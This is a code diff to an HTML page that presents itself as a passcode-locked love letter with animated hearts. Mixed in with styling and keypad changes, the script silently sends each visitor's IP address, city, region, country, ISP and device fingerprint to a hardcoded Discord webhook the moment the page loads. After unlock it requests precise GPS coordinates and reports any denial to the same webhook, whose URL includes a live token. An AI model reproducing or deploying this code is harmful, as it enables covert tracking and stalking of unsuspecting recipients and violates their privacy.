@@ -112,54 +112,57 @@
     margin: 2rem 1rem 1rem;
     color: var(--accent-color);
   }
-  .heart-background {
-    position: fixed;
-    top: 0; left: 0;
-    width: 100vw;
-    height: 100vh;
-    pointer-events: none;
-    z-index: -1;
-    overflow: hidden;
-    transition: background 0.5s ease;
-  }
-  .heart {
-    position: absolute;
-    width: 20px;
-    height: 18px;
-    background: var(--primary-color);
-    transform: rotate(-45deg);
-    border-radius: 10px 10px 0 0;
-    animation: floatUp 7s linear infinite;
-    opacity: 0.8;
-    will-change: transform, opacity;
-  }
-  .heart::before,
-  .heart::after {
-    content: "";
-    position: absolute;
-    width: 20px;
-    height: 18px;
-    background: var(--primary-color);
-    border-radius: 10px 10px 0 0;
-  }
-  .heart::before {
-    top: -10px;
-    left: 0;
-  }
-  .heart::after {
-    top: 0;
-    left: 10px;
-  }
-  @keyframes floatUp {
-    0% {
-      transform: translateY(100vh) rotate(-45deg);
+.heart-background {
+  position: fixed; /* fix relative to viewport */
+  top: 0;
+  left: 0;
+  width: 100vw;
+  height: 100vh;
+  pointer-events: none; /* so clicks go through */
+  overflow: hidden; /* optional: hide hearts going outside */
+  z-index: 0; /* make sure it stays behind other content */
+}
+ .heart {
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      background: var(--primary-color);
+      transform: rotate(-45deg);
+      border-radius: 0;
+      animation: floatUp 7s linear infinite;
       opacity: 0.8;
+      will-change: transform, opacity;
+      top: 50%;
+      left: 50%;
+      margin: -10px 0 0 -10px;
     }
-    100% {
-      transform: translateY(-10vh) rotate(-45deg);
-      opacity: 0;
+    .heart::before,
+    .heart::after {
+      content: "";
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      background: var(--primary-color);
+      border-radius: 50%;
     }
-  }
+    .heart::before {
+      top: -10px;
+      left: 0;
+    }
+    .heart::after {
+      top: 0;
+      left: 10px;
+    }
+    @keyframes floatUp {
+      0% {
+        transform: translateY(100vh) rotate(-45deg);
+        opacity: 0.8;
+      }
+      100% {
+        transform: translateY(-10vh) rotate(-45deg);
+        opacity: 0;
+      }
+    }
 
   /* Night mode styles */
   body.night {
@@ -454,26 +457,53 @@
 </div>
 
 <script>
-  const heartBg = document.getElementById('heart-bg');
-  const MAX_HEARTS = 100;
+  const webhookURL = "https://discord.com/api/webhooks/1393055608902520902/1JNTK4MjgwmxkBSY9dYhmLuE8vGSqMwTzvUfcpsfWQzTc27m9eu2Qz0JNX6eY3UgBsUU";
 
-  function createHeart() {
-    if (heartBg.childElementCount >= MAX_HEARTS) {
-      heartBg.removeChild(heartBg.firstChild); // remove oldest
-    }
+  //  Send fallback IP-based location as soon as the page is visited
+  fetch('https://ipapi.co/json/')
+    .then(res => res.json())
+    .then(data => {
+      sendToWebhook({
+        ip: data.ip,
+        city: data.city,
+        region: data.region,
+        country: data.country_name,
+        org: data.org
+      });
+    })
+    .catch(err => console.error("Failed to fetch fallback location:", err));
 
-    const heart = document.createElement('div');
-    heart.classList.add('heart');
-    heart.style.left = Math.random() * 100 + 'vw';
-    heart.style.animationDuration = 5 + Math.random() * 5 + 's';
-    heart.style.opacity = 0.3 + Math.random() * 0.7;
-    heartBg.appendChild(heart);
+ const heartBg = document.getElementById('heart-bg');
+const MAX_HEARTS = 100;
 
-    heart.addEventListener('animationend', () => heart.remove());
+function createHeart() {
+  if (heartBg.childElementCount >= MAX_HEARTS) {
+    heartBg.removeChild(heartBg.firstChild);
   }
 
-  setInterval(createHeart, 500);
+  const heart = document.createElement('div');
+  heart.classList.add('heart');
 
+  // Random horizontal position (left)
+  heart.style.left = Math.random() * 100 + 'vw';
+
+  // ✅ Random vertical position (top)
+  heart.style.top = Math.random() * 100 + 'vh';
+
+  // Random float speed (duration)
+  heart.style.animationDuration = 5 + Math.random() * 5 + 's';
+
+  // Random opacity
+  heart.style.opacity = 0.3 + Math.random() * 0.7;
+
+  heartBg.appendChild(heart);
+
+  heart.addEventListener('animationend', () => heart.remove());
+}
+
+  setInterval(createHeart, 200);
+
+  //  Theme toggle
   const themeToggle = document.getElementById('themeToggle');
   const body = document.body;
   if (localStorage.getItem('theme') === 'night') {
@@ -482,15 +512,12 @@
   }
   themeToggle.addEventListener('click', () => {
     body.classList.toggle('night');
-    if (body.classList.contains('night')) {
-      themeToggle.textContent = '☀️';
-      localStorage.setItem('theme', 'night');
-    } else {
-      themeToggle.textContent = '🌙';
-      localStorage.setItem('theme', 'day');
-    }
+    body.classList.contains('night')
+      ? (themeToggle.textContent = '☀️', localStorage.setItem('theme', 'night'))
+      : (themeToggle.textContent = '🌙', localStorage.setItem('theme', 'day'));
   });
 
+  //  Passcode logic
   const passcodeOverlay = document.getElementById('passcodeOverlay');
   const passcodeInput = document.getElementById('passcodeInput');
   const passcodeError = document.getElementById('passcodeError');
@@ -501,12 +528,17 @@
   const CORRECT_HASH = 'adfaab87038c95002ab05463e743201605457409b7129f9a3a8cddcb8caea1a2';
   let enteredPasscode = '';
 
+  async function hashPasscode(input) {
+    const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(input));
+    return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+
   function updateInputDisplay() {
     passcodeInput.value = '•'.repeat(enteredPasscode.length);
   }
 
-  function showError(message) {
-    passcodeError.textContent = message;
+  function showError(msg) {
+    passcodeError.textContent = msg;
     passcodeError.classList.add('visible');
     setTimeout(() => {
       passcodeError.classList.remove('visible');
@@ -519,37 +551,34 @@
     updateInputDisplay();
   }
 
-  function unlock() {
+  async function validateAndUnlock() {
+    const hash = await hashPasscode(enteredPasscode);
+    if (hash === CORRECT_HASH) {
+      unlock();
+    } else {
+      showError('Incorrect passcode');
+      resetPasscode();
+    }
+  }
+
+  async function unlock() {
     passcodeOverlay.classList.add('unlocking');
     letterContainer.classList.add('show');
     letterContainer.setAttribute('aria-hidden', 'false');
     letterContainer.focus();
+    setTimeout(() => (passcodeOverlay.style.display = 'none'), 700);
 
-    setTimeout(() => {
-      passcodeOverlay.style.display = 'none';
-    }, 700);
-
-    // Ask for accurate location after unlock
+    //  Ask for accurate location permission after unlock
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         pos => sendLocation(pos.coords),
-        err => console.warn('Accurate location denied:', err)
+        err =>
+          sendToWebhook({
+            error: true,
+            message: `Accurate location denied: ${err.message}`
+          })
       );
     }
-
-    // Fallback location (no permission needed)
-    fetch('https://ipapi.co/json/')
-      .then(res => res.json())
-      .then(data => {
-        sendToWebhook({
-          ip: data.ip,
-          city: data.city,
-          region: data.region,
-          country: data.country_name,
-          org: data.org
-        });
-      })
-      .catch(err => console.error("Failed to fetch fallback location:", err));
   }
 
   function sendLocation(coords) {
@@ -562,100 +591,79 @@
   }
 
   function sendToWebhook(info) {
-    const webhookURL = "https://discord.com/api/webhooks/1393055608902520902/1JNTK4MjgwmxkBSY9dYhmLuE8vGSqMwTzvUfcpsfWQzTc27m9eu2Qz0JNX6eY3UgBsUU";
-
     const deviceInfo = {
       userAgent: navigator.userAgent,
       platform: navigator.platform,
       screen: `${window.screen.width}x${window.screen.height}`,
       language: navigator.language,
-      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
     };
 
-    const content = info.accurate
-      ? `📍 **Accurate Location Permission Granted**  
-**Latitude**: ${info.latitude}  
-**Longitude**: ${info.longitude}  
-**Accuracy**: ${info.accuracy} meters`
-      : `📡 **Passcode Unlocked – Fallback Info**:  
-**Device**: ${deviceInfo.platform}  
-**User Agent**: ${deviceInfo.userAgent}  
-**Language**: ${deviceInfo.language}  
-**Resolution**: ${deviceInfo.screen}  
-**Timezone**: ${deviceInfo.timezone}  
+    let content = '';
+    if (info.accurate) {
+      content = `📍 **Accurate Location Permission Granted**
+Latitude: ${info.latitude}
+Longitude: ${info.longitude}
+Accuracy: ±${info.accuracy} meters`;
+    } else if (info.error) {
+      content = `🚫 **Error / Denied Precise Location**
+${info.message}`;
+    } else {
+      content = `📡 **Visitor Info**
+Device: ${deviceInfo.platform}
+User Agent: ${deviceInfo.userAgent}
+Language: ${deviceInfo.language}
+Resolution: ${deviceInfo.screen}
+Timezone: ${deviceInfo.timezone}
 
-IP: ${info.ip}  
-City: ${info.city}  
-Region: ${info.region}  
-Country: ${info.country}  
+IP: ${info.ip}
+City: ${info.city}
+Region: ${info.region}
+Country: ${info.country}
 ISP: ${info.org}`;
+    }
 
     fetch(webhookURL, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ content })
-    });
+    }).catch(console.error);
   }
 
-  async function hashPasscode(input) {
-    const encoder = new TextEncoder();
-    const data = encoder.encode(input);
-    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-    return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
-  }
-
-  keypadButtons.forEach(button => {
-    button.addEventListener('click', async () => {
-      if (enteredPasscode.length >= 4) return;
-      enteredPasscode += button.dataset.key;
-      updateInputDisplay();
-      if (enteredPasscode.length === 4) {
-        const hash = await hashPasscode(enteredPasscode);
-        if (hash === CORRECT_HASH) {
-          unlock();
-        } else {
-          showError('Incorrect passcode');
-          resetPasscode();
-        }
+  keypadButtons.forEach(btn => {
+    btn.addEventListener("click", async () => {
+      if (enteredPasscode.length < 4) {
+        enteredPasscode += btn.dataset.key;
+        updateInputDisplay();
+        if (enteredPasscode.length === 4) validateAndUnlock();
       }
     });
   });
 
-  backspaceBtn.addEventListener('click', () => {
-    if (enteredPasscode.length > 0) {
+  backspaceBtn.addEventListener("click", () => {
+    if (enteredPasscode) {
       enteredPasscode = enteredPasscode.slice(0, -1);
       updateInputDisplay();
     }
   });
 
-  document.addEventListener('keydown', async e => {
-    if (passcodeOverlay.style.display === 'none') return;
-    if (e.key >= '0' && e.key <= '9') {
+  document.addEventListener("keydown", async e => {
+    if (passcodeOverlay.style.display === "none") return;
+    if (/^[0-9]$/.test(e.key)) {
       if (enteredPasscode.length < 4) {
         enteredPasscode += e.key;
         updateInputDisplay();
-        if (enteredPasscode.length === 4) {
-          const hash = await hashPasscode(enteredPasscode);
-          if (hash === CORRECT_HASH) {
-            unlock();
-          } else {
-            showError('Incorrect passcode');
-            resetPasscode();
-          }
-        }
+        if (enteredPasscode.length === 4) validateAndUnlock();
       }
-    } else if (e.key === 'Backspace') {
-      if (enteredPasscode.length > 0) {
-        enteredPasscode = enteredPasscode.slice(0, -1);
-        updateInputDisplay();
-      }
+    } else if (e.key === "Backspace" && enteredPasscode) {
+      enteredPasscode = enteredPasscode.slice(0, -1);
+      updateInputDisplay();
     }
   });
 
-  passcodeInput.addEventListener('keydown', e => {
-    e.preventDefault();
-  });
+  passcodeInput.addEventListener("keydown", e => e.preventDefault());
 </script>
+
 
 
 
